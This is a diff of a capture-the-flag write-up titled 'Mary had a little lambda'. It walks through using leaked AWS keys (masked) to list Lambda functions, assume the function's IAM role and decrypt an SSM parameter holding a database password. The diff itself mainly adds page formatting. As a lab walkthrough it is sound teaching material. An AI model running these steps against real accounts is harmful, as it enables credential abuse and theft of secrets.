@@ -1,6 +1,8 @@
-Mary had a little lambda
-======================
-
+---
+layout: page
+title : "Mary had a little lambda"
+category: CTF
+---
 - **Category**: misc
 - **Difficulty**: medium
 - **Author**: gyrospectre
@@ -16,22 +18,27 @@ MARY's secrets!
 ### Handout files
 
 - [./publish/access_key.txt](./publish/access_key.txt)
+
 ```
 devopsadmin
 aws_access_key_id=AKIAXXXXXXXXXXXXXXXX
 aws_secret_access_key=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 region=us-east-1
 ```
+
 ---
 ## Solve
 1. Install AWS Cli and configure a profile with access key credentials
+
 ```bash
 $ aws configure --profile devopsadmin
 AWS Access Key ID [None]: AKIAXXXXXXXXXXXXXXXX 
 AWS Secret Access Key [None]:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Default region name [None]: us-east-1
 ```
+
 2. Start exploring what's available
+
 ```bash
 $ aws lambda list-functions --profile devopsadmin
 {
@@ -164,18 +171,23 @@ statusCode' : 200,
 
 3. Returned yakbase.py contains a variable using `ssm.get_paramater(Name="/production/database/password", WithDecryption=True)['Parameter']['Value']` and the function runs under Role:"arn:aws:iam::487266254163:role/lambda_role"
 4. assuming the role from yakbase function
+
 ```bash
 $ aws sts assume-role --role-arn arn:aws:iam::487266254163:role/lambda_role --role-session-name mysession --profile devopsadmin
 ```
+
 5. Export access credentials
+
 ```bash
 $ 
 export AWS_ACCESS_KEY_ID=
 export AWS_SECRET_ACCESS_KEY=
 export AWS_SESSION_TOKEN=
 ```
+
 6. Add these to `~/.aws/credentials`
 7. Use `get-parameter` with the new assumed role to retrieve the flag
+
 ```bash
 $ aws ssm get-parameter --name "/production/database/password" --with-decryption --profile devopsadmin
 results = cursor. fetchall()
